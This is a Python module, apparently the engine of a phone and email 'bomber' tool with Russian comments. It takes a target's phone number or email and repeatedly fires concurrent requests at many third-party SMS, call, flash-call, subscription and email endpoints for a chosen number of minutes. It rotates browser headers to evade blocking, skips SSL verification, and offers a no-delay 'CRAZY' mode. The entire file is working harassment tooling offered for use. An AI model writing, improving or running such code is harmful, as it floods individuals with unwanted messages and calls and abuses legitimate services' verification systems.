from asyncio import ensure_future, gather, run, sleep as asleep
from aiohttp import ClientSession, ClientTimeout
import asyncio
import time
import random
import threading

from Core.Attack.Services import urls
from Core.Attack.Services_Extra import extra_urls
from Core.Attack.Services_FlashCall import flashcall_urls
from Core.Attack.Services_EmailBomb import email_bomb_urls
from Core.Attack.Services_Subscribe import subscribe_urls
from Core.Attack.Services_Lookup import lookup_urls
from Core.Attack.ServiceRegistry import record_result, is_enabled

# Флаг остановки
_stop_lock = threading.Lock()
_stop_flag = False
_progress_callback = None

def set_progress_callback(cb):
    global _progress_callback
    _progress_callback = cb

def _is_stopped():
    with _stop_lock:
        return _stop_flag

def _set_stopped(val=True):
    global _stop_flag
    with _stop_lock:
        _stop_flag = val

# User-Agent pool
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 Chrome/107.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 Chrome/111.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone14,6; iOS 16.2) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 11; POCO X3 Pro) AppleWebKit/537.36 Chrome/109.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/111.0.0.0 Safari/537.36",
]

async def make_request(session, url_data, attack_type, delay_min=0.1, delay_max=0.5):
    """Common request handler"""
    try:
        if _is_stopped():
            return None

        allowed = {
            "MIX": ("SMS", "CALL"),
            "SMS": ("SMS",),
            "CALL": ("CALL",),
            "FLASHCALL": ("FLASHCALL",),
            "EMAIL": ("EMAIL",),
            "SUBSCRIBE": ("SUBSCRIBE",),
            "LOOKUP": ("LOOKUP",),
            "CRAZY": ("SMS", "CALL", "FLASHCALL"),
        }.get(attack_type, ("SMS", "CALL"))

        if url_data['info']['attack'] not in allowed:
            return None

        # Задержка (кроме CRAZY режима)
        if attack_type != "CRAZY":
            await asleep(random.uniform(delay_min, delay_max))

        # Ротация заголовков
        headers = url_data.get('headers', {}).copy()
        headers['User-Agent'] = random.choice(USER_AGENTS)
        headers['Accept-Language'] = random.choice(['ru-RU,ru;q=0.9', 'en-US,en;q=0.8', 'ru,en;q=0.9'])
        headers['Cache-Control'] = 'no-cache'

        timeout = ClientTimeout(total=20 if attack_type != "CRAZY" else 10)
        start_t = time.time()
        method = url_data.get('method', 'post').lower()

        async with session.request(
            method,
            url_data['url'],
            params=url_data.get('params'),
            cookies=url_data.get('cookies'),
            headers=headers,
            data=url_data.get('data'),
            json=url_data.get('json'),
            timeout=timeout,
            ssl=False,
        ) as response:
            resp_time = time.time() - start_t
            status = response.status
            try:
                text = await response.text()
            except:
                text = ""
            success = status < 400
            record_result(url_data, success=success, response_time=resp_time)
            return status, len(text)

    except asyncio.TimeoutError:
        record_result(url_data, success=False, response_time=20)
    except Exception:
        record_result(url_data, success=False)
    return None

async def async_attacks(numbers, attack_type, country_filter="ALL", email=None):
    """Run one cycle of attacks"""
    base_number = numbers[0] if numbers else "79123456789"
    
    # Собираем все сервисы в зависимости от режима
    all_services = []
    all_services.extend(urls(base_number))
    all_services.extend(extra_urls(base_number))
    all_services.extend(flashcall_urls(base_number))
    all_services.extend(subscribe_urls(base_number))

    if email:
        all_services.extend(email_bomb_urls(email))
    else:
        all_services.extend(email_bomb_urls())

    if attack_type == "LOOKUP":
        all_services = lookup_urls(base_number)
    elif attack_type == "EMAIL":
        all_services = email_bomb_urls(email) if email else email_bomb_urls()
    elif attack_type == "SUBSCRIBE":
        all_services = subscribe_urls(base_number)
    elif attack_type == "FLASHCALL":
        all_services = flashcall_urls(base_number)
    elif attack_type == "CRAZY":
        # CRAZY = SMS + CALL + FLASHCALL без задержек
        pass  # берём все
    elif attack_type == "SMS":
        pass  # отфильтруется по типу
    elif attack_type == "CALL":
        pass  # отфильтруется по типу

    # Фильтрация
    allowed_types = {
        "MIX": ("SMS", "CALL"),
        "SMS": ("SMS",),
        "CALL": ("CALL",),
        "FLASHCALL": ("FLASHCALL",),
        "EMAIL": ("EMAIL",),
        "SUBSCRIBE": ("SUBSCRIBE",),
        "LOOKUP": ("LOOKUP",),
        "CRAZY": ("SMS", "CALL", "FLASHCALL"),
    }
    atypes = allowed_types.get(attack_type, ("SMS", "CALL"))
    
    services = [s for s in all_services 
                if s['info']['attack'] in atypes 
                and is_enabled(s)
                and (country_filter == 'ALL' or s['info'].get('country', 'ALL') == country_filter)]
    
    if not services:
        return {"total": 0, "success": 0, "fail": 0}

    timeout = ClientTimeout(total=30)
    delay_min = 0.05 if attack_type == "CRAZY" else 0.1
    delay_max = 0.1 if attack_type == "CRAZY" else 0.5

    async with ClientSession(timeout=timeout) as session:
        tasks = []
        for s in services:
            tasks.append(ensure_future(make_request(session, s, attack_type, delay_min, delay_max)))
        
        results = await gather(*tasks, return_exceptions=True)
        ok = sum(1 for r in results if r is not None and isinstance(r, tuple) and r[0] < 400)
        fail = sum(1 for r in results if r is None or (isinstance(r, tuple) and r[0] >= 400))
        
        return {"total": len(tasks), "success": ok, "fail": fail}

def start_async_attacks(numbers, minutes, attack_type="MIX", stop_previous=False, 
                        progress_callback=None, country_filter="ALL", email=None):
    import time as tm
    
    if stop_previous:
        tm.sleep(0.5)
        _set_stopped(False)
    
    if progress_callback:
        set_progress_callback(progress_callback)
    
    start_time = tm.time()
    duration = float(minutes) * 60
    cycle = 0
    
    while True:
        if _is_stopped():
            break
        elapsed = tm.time() - start_time
        if elapsed >= duration:
            break
        
        cycle += 1
        result = run(async_attacks(numbers, attack_type, country_filter, email))
        
        if progress_callback and cycle % 5 == 0:
            elapsed_str = f"{int(elapsed // 60)}:{int(elapsed % 60):02d}"
            total_req = result.get('total', 0)
            ok = result.get('success', 0)
            fail = result.get('fail', 0)
            progress_callback(
                f"⏱ Прошло: {elapsed_str} / {minutes} мин.\n"
                f"🔄 Циклов: {cycle}\n"
                f"📨 Всего запросов: {total_req * cycle}\n"
                f"✅ Успешно: {ok}\n"
                f"❌ Ошибок: {fail}"
            )

def stop_attacks():
    _set_stopped(True)
